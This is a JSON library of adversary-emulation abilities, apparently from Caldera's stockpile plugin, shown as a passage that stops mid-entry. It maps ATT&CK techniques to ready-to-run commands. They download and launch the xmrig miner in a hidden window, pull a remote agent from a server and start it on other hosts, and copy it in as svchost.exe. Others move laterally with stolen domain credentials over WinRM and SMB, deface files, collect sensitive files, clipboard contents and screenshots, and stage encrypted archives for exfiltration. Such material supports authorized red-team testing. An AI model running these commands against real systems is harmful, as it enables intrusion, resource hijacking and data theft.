{
    "T1496__impact__Resource Hijacking__46da2385-cf37-49cb-ba4b-a739c7a19de4": {
        "description": "Download and execute Monero miner (xmrig) for 1 minute",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1496",
            "name": "Resource Hijacking"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]\n",
                    "cleanup": "rm -rf ./xmrig*;\n",
                    "timeout": 120
                }
            },
            "darwin": {
                "sh": {
                    "command": "curl -OL https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-macos-x64.tar.gz;\ntar -xf xmrig-6.11.2-macos-x64.tar.gz;\nscreen -S miner -dm ./xmrig-6.11.2/xmrig;\nsleep 60s;\nkillall xmrig;\nscreen -S miner -X quit\n",
                    "cleanup": "rm -rf ./xmrig*;\n",
                    "timeout": 120
                }
            },
            "windows": {
                "psh": {
                    "command": "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;\nExpand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\\;\nStart-Process \".\\xmrig-6.11.2\\xmrig.exe\" -WindowStyle Hidden;\nStart-Sleep -Seconds 60;\nStop-Process -Name \"xmrig\"\n",
                    "cleanup": "rm ./xmrig* -r -fo;\n",
                    "timeout": 120
                }
            }
        },
        "id__dependence__fact": [
            "46da2385-cf37-49cb-ba4b-a739c7a19de4",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "46da2385-cf37-49cb-ba4b-a739c7a19de4"
    },
    "T1491__impact__Defacement__47d08617-5ce1-424a-8cc5-c9c978ce6bf9": {
        "description": "Create a text file for the user to find",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1491",
            "name": "Defacement"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "echo \"proof that this machine was hacked.\" > message.txt\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "echo \"proof that this machine was hacked.\" > message.txt\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"
                }
            }
        },
        "id__dependence__fact": [
            "47d08617-5ce1-424a-8cc5-c9c978ce6bf9",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9"
    },
    "T1565.001__impact__Data Manipulation: Stored Data Manipulation__55f9600a-756f-496b-b27f-682052dc429c": {
        "description": "Hunts for files of a certain extension and inserts a message",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1565.001",
            "name": "Data Manipulation: Stored Data Manipulation"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                    "payloads": [
                        "mission.go"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                    "payloads": [
                        "mission.go"
                    ]
                }
            },
            "windows": {
                "cmd": {
                    "command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\",
                    "payloads": [
                        "mission.go"
                    ]
                },
                "psh": {
                    "command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';",
                    "payloads": [
                        "mission.go"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "55f9600a-756f-496b-b27f-682052dc429c",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "55f9600a-756f-496b-b27f-682052dc429c"
    },
    "T1499__impact__Endpoint Denial of Service__2fe2d5e6-7b06-4fc0-bf71-6966a1226731": {
        "description": "Turn a computers WIFI off",
        "tactic": "impact",
        "technique": {
            "attack_id": "T1499",
            "name": "Endpoint Denial of Service"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./wifi.sh off\n",
                    "cleanup": "./wifi.sh on\n",
                    "payloads": [
                        "wifi.sh"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "./wifi.sh off\n",
                    "cleanup": "./wifi.sh on\n",
                    "payloads": [
                        "wifi.sh"
                    ]
                }
            },
            "windows": {
                "psh": {
                    "command": ".\\wifi.ps1 -Off\n",
                    "cleanup": ".\\wifi.ps1 -On\n",
                    "payloads": [
                        "wifi.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2fe2d5e6-7b06-4fc0-bf71-6966a1226731",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731"
    },
    "T1570__lateral-movement__Lateral Tool Transfer__4908fdc4-74fc-4d7c-8935-26d11ad26a8d": {
        "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1570",
            "name": "Lateral Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n",
                    "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            },
            "darwin": {
                "sh": {
                    "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n",
                    "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n",
                    "payloads": [
                        "sandcat.go-darwin"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n",
                    "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n",
                    "payloads": [
                        "sandcat.go-linux"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d"
    },
    "T1021.002__lateral-movement__Remote Services: SMB/Windows Admin Shares__40161ad0-75bd-11e9-b475-0800200c9a66": {
        "description": "Mounts a network file share on a target computer",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n",
                    "cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n"
                }
            }
        },
        "id__dependence__fact": [
            "40161ad0-75bd-11e9-b475-0800200c9a66",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "40161ad0-75bd-11e9-b475-0800200c9a66"
    },
    "T1021.002__lateral-movement__Remote Services: SMB/Windows Admin Shares__65048ec1-f7ca-49d3-9410-10813e472b30": {
        "description": "Copy 54ndc47 to remote host (SMB)",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n",
                    "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.54ndc47_remote_copy": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_54ndc47_copy"
                            }
                        ]
                    },
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "65048ec1-f7ca-49d3-9410-10813e472b30",
            "remote.host.fqdn",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30"
    },
    "T1021.006__lateral-movement__Remote Services: Windows Remote Management__41bb2b7a-75af-49fd-bd15-6c827df25921": {
        "description": "Start Agent using WinRM (WinRM)",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n",
                    "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "41bb2b7a-75af-49fd-bd15-6c827df25921",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921"
    },
    "T1021.002__lateral-movement__Remote Services: SMB/Windows Admin Shares__aa6ec4dd-db09-4925-b9b9-43adeb154686": {
        "description": "Mount a windows share",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n",
                    "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.share_mounted": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_share"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "aa6ec4dd-db09-4925-b9b9-43adeb154686",
            "remote.host.fqdn",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "aa6ec4dd-db09-4925-b9b9-43adeb154686"
    },
    "T1021.006__lateral-movement__Remote Services: Windows Remote Management__3734aa1e-c536-42b3-8912-4c91b8bdce90": {
        "description": "Copy Sandcat file using PowerShell",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n",
                    "cleanup": "del sandcat.go-windows; Invoke-Command -ComputerName",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3734aa1e-c536-42b3-8912-4c91b8bdce90",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3734aa1e-c536-42b3-8912-4c91b8bdce90"
    },
    "T1119__collection__Automated Collection__10fad81e-3f68-47be-83b6-fbee7711c6a9": {
        "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1119",
            "name": "Automated Collection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": ".\\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'\n -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'\n -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}\n -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'\n -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}\n",
                    "timeout": 300,
                    "payloads": [
                        "file_search.ps1"
                    ],
                    "cleanup": "if ('#{windows.staging.location}' -match \"recycle[``|\\s]+bin\") {\n       $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value;\n       $StageDir = \"C:\\`$Recycle.Bin\\$sid\\s\";\n} else { $StageDir = '#{windows.staging.location}\\s'; };\nif (Test-Path -Path $StageDir) {Remove-Item -Force -Recurse $StageDir};\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "chmod +x ./file_search.sh; ./file_search.sh --extensions '#{linux.included.extensions}'\n --directories '#{linux.included.directories}' --exclude-dir '#{linux.excluded.directories}'\n --accessed '#{file.last.accessed}' --modified '#{file.last.modified}' --search-strings '#{file.sensitive.content}'\n --staging-directory '#{linux.staging.location}' --safe-mode '#{safe.mode.enabled}' --pseudo-ext '#{pseudo.data.identifier}'\n",
                    "timeout": 300,
                    "payloads": [
                        "file_search.sh"
                    ],
                    "cleanup": "if [ -d '#{linux.staging.location}' ]; then rm -rf '#{linux.staging.location}/.s'; fi;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "10fad81e-3f68-47be-83b6-fbee7711c6a9",
            "None",
            "host.dir.staged",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9"
    },
    "T1059.001__collection__Command and Scripting Interpreter: PowerShell__55678719-e76e-4df9-92aa-10655bbd1cf4": {
        "description": "User enumeration",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"
                }
            }
        },
        "id__dependence__fact": [
            "55678719-e76e-4df9-92aa-10655bbd1cf4",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "55678719-e76e-4df9-92aa-10655bbd1cf4"
    },
    "T1057__collection__Process Discovery__cc191baa-7472-4386-a2f4-42f203f1acfd": {
        "description": "Process discovery via SysInternals pstool",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"
                }
            }
        },
        "id__dependence__fact": [
            "cc191baa-7472-4386-a2f4-42f203f1acfd",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "cc191baa-7472-4386-a2f4-42f203f1acfd"
    },
    "T1005__collection__Data from Local System__720a3356-eee1-4015-9135-0fc08f7eb2d5": {
        "description": "This ability will locate directories that are cloned Git repositories.",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1005",
            "name": "Data from Local System"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.git"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.git"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "720a3356-eee1-4015-9135-0fc08f7eb2d5",
            "None",
            "host.dir.git",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "720a3356-eee1-4015-9135-0fc08f7eb2d5"
    },
    "T1005__collection__Data from Local System__90c2efaa-8205-480d-8bb6-61d90dbaf81b": {
        "description": "Locate files deemed sensitive",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1005",
            "name": "Data from Local System"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.file.path",
                                "edge": "has_extension",
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.file.path",
                                "edge": "has_extension",
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.file.path",
                                "edge": "has_extension",
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
            "None",
            "host.file.path",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b"
    },
    "T1074.001__collection__Data Staged: Local Data Staging__6469befa-748a-4b9c-a96d-f191fde47d89": {
        "description": "create a directory for exfil staging",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "mkdir -p staged && echo $PWD/staged\n",
                    "cleanup": "rm -rf staged\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "mkdir -p staged && echo $PWD/staged\n",
                    "cleanup": "rm -rf staged\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n",
                    "cleanup": "Remove-Item -Path \"staged\" -recurse\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.staged"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "6469befa-748a-4b9c-a96d-f191fde47d89",
            "None",
            "host.dir.staged",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89"
    },
    "T1560.001__collection__Archive Collected Data: Archive via Utility__30a8cf10-73dc-497c-8261-a64cc9e91505": {
        "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n",
                    "cleanup": "rm #{host.dir.staged}.tar.gz.gpg\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n",
                    "cleanup": "rm #{host.dir.staged}.7z\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "30a8cf10-73dc-497c-8261-a64cc9e91505",
            "host.dir.staged",
            "host.dir.compress",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505"
    },
    "T1059.001__collection__Command and Scripting Interpreter: PowerShell__702bfdd2-9947-4eda-b551-c3a1ea9a59a2": {
        "description": "System Information Gathering Script",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"
                }
            }
        },
        "id__dependence__fact": [
            "702bfdd2-9947-4eda-b551-c3a1ea9a59a2",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2"
    },
    "T1115__collection__Clipboard Data__b007fe0c-c6b0-4fda-915c-255bbc070de2": {
        "description": "copy the contents for the clipboard and print them",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
            "name": "Clipboard Data"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "pbpaste\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Get-Clipboard -raw\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "xclip -o\n"
                }
            }
        },
        "id__dependence__fact": [
            "b007fe0c-c6b0-4fda-915c-255bbc070de2",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2"
    },
    "T1113__collection__Screen Capture__316251ed-6a28-4013-812b-ddf5b5b007f8": {
        "description": "capture the contents of the screen",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1113",
            "name": "Screen Capture"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n",
                    "cleanup": "for i in {1..5}; do /bin/rm screen-$i.png; done;",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.screenshot.png"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;\n",
                    "cleanup": "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.screenshot.png"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "316251ed-6a28-4013-812b-ddf5b5b007f8",
            "None",
            "host.screenshot.png",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8"
    },
    "T1047__collection__WMIC__94f21386-9547-43c4-99df-938ab05d45ce": {
        "description": "Capture process id, executable path, pid and parent pid before writing to disk",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1047",
            "name": "WMIC"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
                }
            }
        },
        "id__dependence__fact": [
            "94f21386-9547-43c4-99df-938ab05d45ce",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "94f21386-9547-43c4-99df-938ab05d45ce"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__ccdb8caf-c69e-424b-b930-551969450c57": {
        "description": "Download",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
